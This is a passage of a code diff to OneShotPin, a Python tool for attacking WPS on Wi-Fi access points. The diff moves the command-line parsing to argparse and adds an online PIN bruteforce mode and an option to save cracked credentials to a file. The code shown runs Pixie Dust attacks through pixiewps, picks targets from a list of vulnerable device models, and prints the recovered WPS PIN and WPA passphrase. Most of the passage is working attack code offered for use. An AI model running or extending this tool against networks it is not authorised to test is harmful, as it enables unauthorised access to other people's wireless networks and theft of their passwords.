-        essid = truncateStr(network['ESSID'], 25)
-        deviceName = truncateStr(network['Device name'], 27)
-        line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
-            number, network['BSSID'], essid,
-            network['Security type'], network['Level'],
-            deviceName, model
-            )
-        if network['WPS locked']:
-            print(colored(line, color='red'))
-        elif model in vuln_list:
-            print(colored(line, color='green'))
-        else:
-            print(line)
-
-
-def suggest_network(options, vuln_list):
-    networks = wifi_scan(options.interface)
-    if not networks:
-        die('No networks found.')
-    scanner_pretty_print(networks, vuln_list)
-    while 1:
-        networkNo = input('Select target: ')
-        try:
-            if networkNo.lower() == 'r':
-                return suggest_network(options, vuln_list)
-            elif int(networkNo) in range(1, len(networks)+1):
-                options.bssid = networks[int(networkNo) - 1]['BSSID']
-            else:
-                raise IndexError
-        except Exception:
-            print('Invalid number')
-        else:
-            break
-
-
+# Not implemented yet
+'''
 def suggest_wpspin(options):
     pins = wpsGen.getSuggested(options.bssid)
     if len(pins) > 1:
@@ -643,19 +820,11 @@ def suggest_wpspin(options):
                 break
     elif len(pins) == 1:
         pin = pins[0]
-        print('The only probable pin code is selected:', pin['name'])
+        print('[i] The only probable pin code is selected:', pin['name'])
         options.pin = pin['pin']
     else:
         options.pin = '12345670'
-
-
-def parse_pixiewps(output):
-    lines = output.splitlines()
-    for line in lines:
-        if ('[+]' in line) and ('WPS' in line):
-            pin = line.split(':')[-1].strip()
-            return pin
-    return False
+'''
 
 
 def die(msg):
@@ -664,108 +833,122 @@ def die(msg):
 
 
 def usage():
-    die("""
+    return """
 OneShotPin 0.0.2 (c) 2017 rofl0r, moded by drygdryg
 
-{} <arguments>
+%(prog)s <arguments>
 
-Required Arguments:
+Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use
 
-Optional Arguments:
+Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
-    -F, --force              : Run Pixiewps with --force option (bruteforce full range)
-    -X                       : Alway print Pixiewps command
-    -v                       : Verbose output
+    -B, --bruteforce         : Run online bruteforce attack
+
+Advanced arguments:
+    -d, --delay=<n>          : Set the delay between pin attempts for bruteforce attack [0]
+    -w, --write              : Write AP credentials to the file on success
+    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
+    -X, --show-pixie-cmd     : Alway print Pixiewps command
+    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
+    -v, --verbose            : Verbose output
 
 Example:
-    {} -i wlan0 -b 00:90:4C:C1:AC:21 -K
-""".format(sys.argv[0], sys.argv[0]))
-
-
-def cleanup(wpas, options):
-    wpas.terminate()
-    shutil.rmtree(options.tempdir, ignore_errors=True)
-    os.remove(options.tempconf)
+    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
+"""
 
 
 if __name__ == '__main__':
-    VULNWSCFILE = 'vulnwsc.txt'
-    options = Options()
-    wpsGen = WPSpin()
+    import argparse
 
-    import getopt
-    optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:XFKv", ["help", "interface", "bssid", "pin", "force", "pixie-dust"])
-    for a, b in optlist:
-        if a in ('-i', "--interface"): options.interface = b
-        elif a in ('-b', "--bssid"): options.bssid = b.upper()
-        elif a in ('-p', "--pin"): options.pin = b
-        elif a in ('-K', "--pixie-dust"): options.pixiemode = True
-        elif a in ('-F', "--force"): options.full_range = True
-        elif a in ('-X'): options.showpixiecmd = True
-        elif a in ('-v'): options.verbose = True
-        elif a == '--help': usage()
+    parser = argparse.ArgumentParser(
+        description='OneShotPin 0.0.2 (c) 2017 rofl0r, moded by drygdryg',
+        epilog='Example: {} -i wlan0 -b 00:90:4C:C1:AC:21 -K'.format(sys.argv[0])
+        )
+
+    parser.add_argument(
+        '-i', '--interface',
+        type=str,
+        required=True,
+        help='Name of the interface to use'
+        )
+    parser.add_argument(
+        '-b', '--bssid',
+        type=str,
+        help='BSSID of the target AP'
+        )
+    parser.add_argument(
+        '-p', '--pin',
+        type=str,
+        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
+        )
+    parser.add_argument(
+        '-K', '--pixie-dust',
+        action='store_true',
+        help='Run Pixie Dust attack'
+        )
+    parser.add_argument(
+        '-F', '--pixie-force',
+        action='store_true',
+        help='Run Pixiewps with --force option (bruteforce full range)'
+        )
+    parser.add_argument(
+        '-X', '--show-pixie-cmd',
+        action='store_true',
+        help='Alway print Pixiewps command'
+        )
+    parser.add_argument(
+        '-B', '--bruteforce',
+        action='store_true',
+        help='Run online bruteforce attack'
+        )
+    parser.add_argument(
+        '-d', '--delay',
+        type=int,
+        help='Set the delay between pin attempts'
+        )
+    parser.add_argument(
+        '-w', '--write',
+        action='store_true',
+        help='Write credentials to the file on success'
+        )
+    parser.add_argument(
+        '-v', '--verbose',
+        action='store_true',
+        help='Verbose output'
+        )
+    parser.add_argument(
+        '--vuln-list',
+        type=str,
+        default='vulnwsc.txt',
+        help='Use custom file with vulnerable devices list'
+        )
+
+    args = parser.parse_args()
+
     if os.getuid() != 0:
         die("Run it as root")
-    if not options.interface:
-        die("Please specify interface name (-i) (use --help for usage)")
-    if not ifaceUp(options.interface):
-        die('Unable to up interface "{}"'.format(options.interface))
-    if not options.bssid:
-        print('BSSID not specified (--bssid) — scanning for available networks...')
+
+    if not ifaceUp(args.interface):
+        die('Unable to up interface "{}"'.format(args.interface))
+
+    companion = Companion(args.interface, args.write, print_debug=args.verbose)
+    if not args.bssid:
         try:
-            with open(VULNWSCFILE, 'r') as file:
+            with open(args.vuln_list, 'r', encoding='utf-8') as file:
                 vuln_list = file.read().splitlines()
         except FileNotFoundError:
             vuln_list = []
-        try:
-            suggest_network(options, vuln_list)
-        except KeyboardInterrupt:
-            ifaceUp(options.interface, down=True)
-            die('\nAborting...')
-    if options.pin is None:
-        if options.pixiemode:
-            suggested_pins = wpsGen.getSuggestedList(options.bssid)
-            if suggested_pins:
-                options.pin = suggested_pins[0]
-            else:
-                options.pin = '12345670'
-        else:
-            suggest_wpspin(options)
+        scanner = WiFiScanner(args.interface, companion, vuln_list)
+        print('[*] BSSID not specified (--bssid) — scanning for available networks')
+        args.bssid = scanner.suggest_network()
+        if not args.bssid:
+            exit()
 
-    data = Data()
-    connect(options, data)
-
-    if data.wpa_psk:
-        print("[+] WPS PIN: '{}'".format(options.pin))
-        print("[+] WPA PSK: '{}'".format(data.wpa_psk))
-        print("[+] AP SSID: '{}'".format(options.essid))
-        sys.exit(0)
-
-    elif data.got_all() and options.pixiemode:
-        pixiecmd = data.get_pixie_cmd(options.full_range)
-        print("Running Pixiewps...")
-        if options.verbose or options.showpixiecmd: print("Cmd: {}".format(pixiecmd))
-        out = shellcmd(pixiecmd)
-        print(out)
-        a = parse_pixiewps(out)
-        if a and a != '<empty>':
-            options.pin = a
-            options.pixiemode = False
-            data.clear()
-            print('[+] Trying to get WPA PSK with the correct PIN...'.format(options.pin))
-            connect(options, data)
-
-            if data.wpa_psk:
-                print("[+] WPS PIN: '{}'".format(options.pin))
-                print("[+] WPA PSK: '{}'".format(data.wpa_psk))
-                print("[+] AP SSID: '{}'".format(options.essid))
-                sys.exit(0)
-            sys.exit(1)
-    elif options.pixiemode:
-        print('[!] No enough data to run Pixie Dust attack')
-        sys.exit(1)
-
-    sys.exit(1)
+    if args.bruteforce:
+        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+    else:
+        companion.single_connection(args.bssid, args.pin, args.pixie_dust,
+                                    args.show_pixie_cmd, args.pixie_force)
